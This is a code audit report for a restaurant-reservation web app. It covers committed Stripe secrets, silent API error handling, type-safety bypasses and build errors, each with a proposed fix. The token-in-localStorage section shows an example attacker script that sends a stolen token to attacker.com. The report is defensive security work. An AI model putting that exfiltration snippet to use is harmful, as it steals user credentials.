# R3STO Technical Audit - Detailed Findings

## File Structure Overview

```
/Desktop--R3STO/
├── .env                          [CRITICAL] Production credentials committed
├── .env.example                  [OK] Template for env vars
├── .gitignore                    [OK] Exists but .env is NOT ignored
├── package.json                  [OK] Dependencies are recent
├── tsconfig.json                 [OK] Composite config
├── tsconfig.app.json             [OK] Strict mode enabled
├── tsconfig.node.json            [OK] Build config
├── vite.config.ts                [MINEUR] Minimal, missing optimization
│
├── src/
│   ├── App.tsx                   [IMPORTANT] 8 any types, missing dependency
│   ├── main.tsx                  [OK] Clean entry point
│   ├── index.css                 [OK] Global styles
│   ├── App.css                   [OK] App-specific styles
│   │
│   ├── api/
│   │   ├── apiService.ts         [IMPORTANT] 15+ any types, empty catch blocks
│   │   └── apiPush.ts            [CRITICAL] Silent error handling
│   │
│   ├── store/
│   │   ├── useAppStore.ts        [IMPORTANT] Core state, 20 console.logs
│   │   └── index.ts              [IMPORTANT] TS errors (missing SMS fields)
│   │
│   ├── types/
│   │   └── index.ts              [OK] Well-defined types, some duplication
│   │
│   ├── utils/
│   │   ├── RULES.ts              [OK] 28K lines, business logic
│   │   ├── stripe.ts             [CRITICAL] @ts-ignore, type safety issues
│   │   ├── demoData.ts           [IMPORTANT] TS error, 1800 lines demo data
│   │   ├── emails.ts             [OK] Well-structured email templates
│   │   ├── analytics.ts          [OK] Analytics integration
│   │   ├── design.ts             [OK] Design system constants
│   │   ├── placementRules.ts     [OK] Complex table allocation logic
│   │   ├── alerts.ts             [OK] Alert system
│   │   ├── sms.ts                [OK] SMS templates
│   │   ├── emailTemplates.ts     [OK] Email template definitions
│   │   └── date.ts               [OK] Date utilities
│   │
│   ├── hooks/
│   │   ├── useApiSync.ts         [CRITICAL] Token in localStorage
│   │   ├── useAnalytics.ts       [OK]
│   │   └── (other hooks)         [OK]
│   │
│   ├── views/
│   │   ├── Dashboard/            [IMPORTANT] 500+ lines
│   │   ├── Resas/                [IMPORTANT] Hardcoded status definitions
│   │   ├── Commandes/            [IMPORTANT] Hardcoded test orders, unused vars
│   │   ├── Widget/               [IMPORTANT] Hardcoded test data
│   │   ├── Grille/               [OK] Complex grid logic
│   │   ├── Options/              [OK] Configuration panel
│   │   ├── ... (20+ other views) [OK] Most are well-structured
│   │
│   ├── components/
│   │   ├── layout/               [IMPORTANT] Header, Sidebar, Nav
│   │   ├── ui/                   [OK] Form components, modals
│   │   └── modals/               [OK] Dialog components
│   │
│   ├── i18n/
│   │   ├── translations.ts       [OK] Well-organized i18n
│   │   └── useTranslation.ts     [OK] Hook for translations
│   │
│   ├── __tests__/
│   │   ├── store.test.ts         [IMPORTANT] Uses require() forbidden
│   │   ├── types.test.ts         [IMPORTANT] 3 unused imports
│   │   ├── utils.test.ts         [IMPORTANT] 3 undefined symbols
│   │   └── translations.test.ts  [IMPORTANT] 15x require() forbidden
│   │
│   └── styles/
│       └── global.css            [OK] Clean global styles
│
└── api/
    ├── .env                      [CRITICAL] Stripe keys exposed
    ├── .env.example              [OK] Template
    ├── server.ts                 [IMPORTANT] 15+ any types
    ├── package.json              [OK]
    ├── tsconfig.json             [OK]
    └── nestjs-stripe-module/     [OK] Stripe integration
```

---

## Detailed Issue Breakdown by File

### 🔴 CRITICAL FILES

#### `.env` and `api/.env`
**Status:** SECURITY BREACH
**Issue:** Production Stripe credentials committed to git

```
File: .env
─────────────────────────────────────────
VITE_STRIPE_PUBLIC_KEY=pk_live_51TFWLQ906pQ0p...
VITE_API_BASE=https://api.r3sto.ch/api
VITE_API_MODE=api

STRIPE_SECRET_KEY=sk_live_51TFWLQ906pQ0p...  ← EXPOSED
STRIPE_WEBHOOK_SECRET=whsec_WyRM5UJe1Vp...   ← EXPOSED
```

**Verification:**
```bash
$ git check-ignore .env
$ (no output - NOT ignored)

$ git log --all --full-history -- .env
$ (shows .env in commit history)
```

**Fix:**
```bash
# 1. Rotate keys immediately in Stripe Dashboard
# 2. Remove from git history
git filter-branch --force --index-filter \
  'git rm --cached --ignore-unmatch .env' \
  --prune-empty --tag-name-filter cat -- --all

# 3. Clean git
git reflog expire --expire=now --all
git gc --prune=now --aggressive

# 4. Force push
git push origin --force --all
git push origin --force --tags

# 5. Verify
git log --all --full-history -- .env  # Should be empty now
```

---

#### `src/api/apiPush.ts`
**Status:** CRITICAL - Silent Failure Pattern
**Lines:** 1-83

**Issue:** All API calls silently swallow errors
```typescript
export const apiPush = {
  createResa: (resa: any) =>
    shouldPush() && apiFetch('/resas', { method: 'POST', body: JSON.stringify(resa) })
      .catch(console.warn),  // ← LINE 45: Error is swallowed

  updateResa: (id: string, patch: any) =>
    shouldPush() && apiFetch(`/resas/${id}`, { method: 'PATCH', body: JSON.stringify(patch) })
      .catch(console.warn),  // ← LINE 48: Error is swallowed

  // ... 30+ more identical patterns
}
```

**Flow:**
1. User creates reservation in UI
2. `useAppStore.addResa()` calls `apiPush.createResa()`
3. Store updates immediately (optimistic)
4. Network request fails (timeout, 500, auth, etc.)
5. Error is caught and console.warn() is called
6. Function returns `undefined` silently
7. User sees reservation saved, but backend has nothing
8. On refresh, reservation disappears

**Fix:**
```typescript
// Option 1: Async queue with retry
class ApiQueue {
  private queue: Array<{ fn: () => Promise<any>, retries: number }> = []

  async push(fn: () => Promise<any>) {
    this.queue.push({ fn, retries: 0 })
    await this.process()
  }

  private async process() {
    for (const item of this.queue) {
      try {
        await item.fn()
        this.queue.remove(item)
      } catch (err) {
        if (item.retries < 3) {
          item.retries++
          await sleep(Math.pow(2, item.retries) * 1000)  // Exponential backoff
        } else {
          showToast('Erreur: changement non sauvegardé')
          this.queue.remove(item)
        }
      }
    }
  }
}

// Usage:
apiQueue.push(() => apiFetch('/resas', { method: 'POST', body: JSON.stringify(resa) }))
```

**Option 2: Minimum (for quick fix):**
```typescript
createResa: (resa: any) => {
  if (!shouldPush()) return
  apiFetch('/resas', {
    method: 'POST',
    body: JSON.stringify(resa)
  })
    .catch(err => {
      console.error('[APIPUSH] Failed to create resa:', err)
      useAppStore.setState(s => ({
        globalNotifs: [...s.globalNotifs, {
          id: Date.now().toString(),
          type: 'error',
          msg: 'Erreur: Réservation non sauvegardée',
          table: resa.tbl || 'unknown',
          ts: Date.now(),
          read: false,
        }]
      }))
    })
}
```

---

#### `src/utils/stripe.ts`
**Status:** CRITICAL - Type Safety Bypassed
**Lines:** 1-180

**Issues:**
```typescript
// LINE 12: @ts-ignore hides real type issue
// @ts-ignore
import { loadStripe, type Stripe } from '@stripe/stripe-js'

// LINE 151: @ts-ignore hides method not existing
// @ts-ignore — redirectToCheckout exists at runtime when @stripe/stripe-js is loaded
const { error } = await stripe.redirectToCheckout({ sessionId })
```

**Fix:**
```typescript
// Proper import with types
import { loadStripe } from '@stripe/stripe-js'
import type { Stripe } from '@stripe/stripe-js'

// Proper method check
const stripe = await getStripe()
if (!stripe) throw new Error('Stripe not loaded')

// Check if method exists (new Stripe API doesn't have redirectToCheckout)
if ('redirectToCheckout' in stripe) {
  const { error } = await stripe.redirectToCheckout({ sessionId })
  if (error) throw new Error(error.message)
} else {
  // New API: redirect directly to URL
  if (url) window.location.href = url
}
```

---

### 🟠 IMPORTANT FILES

#### `src/store/index.ts` (Line 169)
**Status:** TypeScript Compilation Error
```typescript
const resto = {
  name: '',
  ville: '',
  paese: 'CH',
  plan: 'bistro',
  maxCvt: 30,
  tel: '',
  email: '',
  web: ''
  // ← MISSING: sms_quota, sms_used, sms_reset_date
}

// Error: Type missing properties from type 'Resto'
```

**Fix:**
```typescript
const resto: Resto = {
  name: '',
  ville: '',
  paese: 'CH',
  plan: 'bistro',
  maxCvt: 30,
  tel: '',
  email: '',
  web: '',
  sms_quota: 0,
  sms_used: 0,
  sms_reset_date: '2026-04-05'
}
```

---

#### `src/utils/demoData.ts` (Line 481)
**Status:** Same TypeScript Error
```typescript
const resto: Resto = {
  name: 'Le Comptoir du Lac',
  ville: 'Sion',
  paese: 'CH',
  plan: 'gastro',
  maxCvt: 120,
  tel: '+41 27 XXX XXXX',
  email: 'info@comptoir-du-lac.ch',
  web: 'www.comptoir-du-lac.ch',
  avg_ticket: 85,
  cuisine: 'Moderne & Locale',
  adresse: 'Rue de Lausanne 42, 1950 Sion'
  // ← MISSING: sms_quota, sms_used, sms_reset_date
}
```

**Fix:** Add the three missing fields to all Resto instances.

---

#### `src/views/Commandes/Commandes.tsx`
**Status:** TypeScript Errors + Hardcoded Test Data

**Error 1 (Line 151-152):**
```typescript
const [tableFilter, setTableFilter] = useState('')  // ← Declared but never read
const [statusFilterMulti, setStatusFilterMulti] = useState([])  // ← Never read
```

**Error 2 (Line 90-120):** Hardcoded test orders:
```typescript
const [orders, setOrders] = useState<Order[]>([
  {
    id: 'cmd1',
    table: 'T3',
    status: 'pending',
    items: [
      { id: 'm1', name: 'Salade César', qty: 2, price: 16 },
      { id: 'm2', name: 'Carpaccio bœuf', qty: 1, price: 22 },
    ],
    total: 54,
    note: '',
    createdAt: Date.now(),
  },
  // ... more hardcoded orders
])
```

**Fix:**
```typescript
// Remove unused setters
// const [tableFilter, setTableFilter] = useState('')  // ← Delete
// const [statusFilterMulti, setStatusFilterMulti] = useState([])  // ← Delete

// Get orders from store instead of hardcoding
const globalNotifs = useAppStore(s => s.globalNotifs)
const orders = globalNotifs
  .filter(n => n.type === 'new_order')
  .map(n => parseOrderFromNotif(n))
```

---

#### `src/views/Widget/Widget.tsx` (Line 96)
**Status:** Block-Scoped Variable Used Before Declaration

```typescript
function Widget() {
  // ...
  // LINE 96: Using 'options' before it's declared
  const defaultOptions = useMemo(() => ({
    ...options,  // ← ERROR: options not defined yet!
    // ...
  }), [options])

  // LINE 51: Now 'options' is declared here
  const [wgtCfg, setWgtCfg] = useState<WidgetConfig>({
    // ...
  })

  // This would be the 'options' variable but declared after usage
}
```

**Fix:** Move useState before useMemo that uses it.

---

#### `src/hooks/useApiSync.ts`
**Status:** CRITICAL - Token in localStorage

```typescript
// LINE 19: Token stored in localStorage
function getToken(): string {
  return localStorage.getItem('r3sto-token') || ''
}

// LINE 29: Used in every API request
headers: {
  'Content-Type': 'application/json',
  ...(token && { Authorization: `Bearer ${token}` }),  // ← Vulnerable
}
```

**Vulnerability:** JavaScript in the browser can read localStorage:
```javascript
// Attacker's malicious script
const token = localStorage.getItem('r3sto-token')
fetch('https://attacker.com/collect?token=' + token)
```

**Fix:**
```typescript
// Move to httpOnly cookie on auth server
// Client never sees the token value
// Set by server: Set-Cookie: r3sto-token=<JWT>; HttpOnly; Secure; SameSite=Strict

// Client automatically sends it with fetch:
fetch('/api/sync/state', {
  method: 'GET',
  credentials: 'include'  // ← Automatically sends httpOnly cookie
})

// Server validates in middleware
app.use((req, res, next) => {
  const token = req.cookies['r3sto-token']  // ← From httpOnly cookie
  // ...
})
```

---

#### `src/views/Resas/Resas.tsx`
**Status:** Type Definition Duplication

```typescript
// LINE 28: Hardcoded in this file
const STATUS_CYCLE: Record<string, string> = {
  reserved: 'arrived', arrived: 'done'
}

// But also defined in:
// src/store/useAppStore.ts:152
// src/utils/design.ts

// If you update one, you forget the others = bugs
```

**Fix:** Create single source:
```typescript
// src/constants/statuses.ts
export const STATUS_CYCLE: Record<ResaStatus, ResaStatus | null> = {
  reserved: 'arrived',
  arrived: 'done',
  done: null,
  noshow: 'reserved',
  cancelled: 'reserved',
  waitlist: 'reserved',
}

// Import everywhere:
import { STATUS_CYCLE } from '../constants/statuses'
```

---

### 🟡 MINEUR FILES

#### `vite.config.ts`
**Status:** Minimal Configuration

**Current:**
```typescript
export default defineConfig({
  plugins: [react()],
  server: {
    host: true,   // expose sur le réseau local (tablette, mobile)
    port: 5173,
  },
})
```

**Missing:**
- Build optimization
- Code splitting
- Asset compression
- Source maps configuration
- .env file handling
- Alias configuration

**Recommended:**
```typescript
import path from 'path'

export default defineConfig({
  plugins: [react()],

  server: {
    host: true,
    port: 5173,
  },

  build: {
    target: 'es2020',
    minify: 'terser',
    sourcemap: process.env.NODE_ENV !== 'production',

    rollupOptions: {
      output: {
        manualChunks: {
          vendor: ['react', 'react-dom', 'react-router-dom'],
          state: ['zustand'],
          api: ['axios', '@stripe/stripe-js'],
        }
      }
    }
  },

  resolve: {
    alias: {
      '@': path.resolve(__dirname, './src'),
      '@components': path.resolve(__dirname, './src/components'),
      '@utils': path.resolve(__dirname, './src/utils'),
      '@views': path.resolve(__dirname, './src/views'),
    }
  }
})
```

---

#### `src/App.tsx`
**Status:** Multiple Issues

**Issue 1 (Line 85):** Variable assigned but not used
```typescript
const { status: _syncStatus } = useApiSync()  // ← Never used
```

**Issue 2 (Line 112):** Missing dependency
```typescript
useEffect(() => {
  // ...
}, [])  // ← Missing: loadDemoData dependency!
```

**Issue 3 (Lines 96, 97, 126, etc.):** 8+ any types
```typescript
const demoData = loadDemoFallback() as any  // ← any
const store = useAppStore.getState() as any  // ← any
```

---

#### `src/__tests__/translations.test.ts`
**Status:** 15+ ESLint Violations

**Issue:** Using forbidden require() in ES modules
```typescript
const getTranslations = require('../../i18n/translations')  // ← Forbidden
const { EMAIL_TEMPLATES } = require('../../utils/emails')   // ← Forbidden
```

**Fix:** Use ES6 imports:
```typescript
import { EMAIL_TEMPLATES } from '../../utils/emails'
import * as translations from '../../i18n/translations'
```

---

## ESLint Issues Summary

**Total Violations: 40+**

| File | Issue | Count |
|------|-------|-------|
| Any types | `@typescript-eslint/no-explicit-any` | 30+ |
| Unused vars | `@typescript-eslint/no-unused-vars` | 5+ |
| Empty catch | `no-empty` | 3+ |
| Require imports | `@typescript-eslint/no-require-imports` | 15+ |
| React deps | `react-hooks/exhaustive-deps` | 2+ |

**Example Error Output:**
```
src/App.tsx:85 error '_syncStatus' is assigned but never used
src/App.tsx:96 error Unexpected any. Specify a different type
src/App.tsx:112 warning useEffect missing 'loadDemoData' dependency
src/api/apiService.ts:46 error Empty block statement
src/__tests__/translations.test.ts:6 error require() forbidden
```

---

## Build Status

**Command:** `npm run build`
**Result:** FAILS

```
src/store/index.ts(169,7): error TS2739: Type missing properties
src/utils/demoData.ts(481,9): error TS2739: Type missing properties
src/views/Commandes/Commandes.tsx(151,23): error TS6133: Never read
src/views/Commandes/Commandes.tsx(152,29): error TS6133: Never read
src/views/Menu/Menu.tsx(40,9): error TS6133: Never read
src/views/Widget/Widget.tsx(96,55): error TS2448: Block-scoped variable

Total: 7 errors prevent compilation
```

---

## Package Dependencies

**Status:** Good
- React 19.2.4 (latest) ✓
- React-DOM 19.2.4 (latest) ✓
- React-Router-DOM 7.13.2 (latest) ✓
- Zustand 5.0.12 (latest) ✓
- TanStack React-Query 5.95.2 (latest) ✓
- Vite 8.0.1 (recent) ✓
- TypeScript 5.9.3 (recent) ✓
- Stripe JS 9.0.0 (recent) ✓

**Recommendation:** Run `npm audit` quarterly, keep dependencies updated.

---

## Recommendations Summary

### Immediate (Today)
1. Rotate Stripe keys
2. Remove .env from git history
3. Fix 7 TypeScript errors
4. Add pre-commit hook

### This Week
1. Fix apiPush error handling
2. Implement proper logging
3. Move token to httpOnly cookie
4. Fix all ESLint violations
5. Add error boundaries
6. Remove @ts-ignore comments

### Before Release
1. Set up Sentry/error tracking
2. Configure monitoring
3. Security audit
4. Load testing
5. Performance optimization

---

*End of Technical Findings - 2026-04-05*
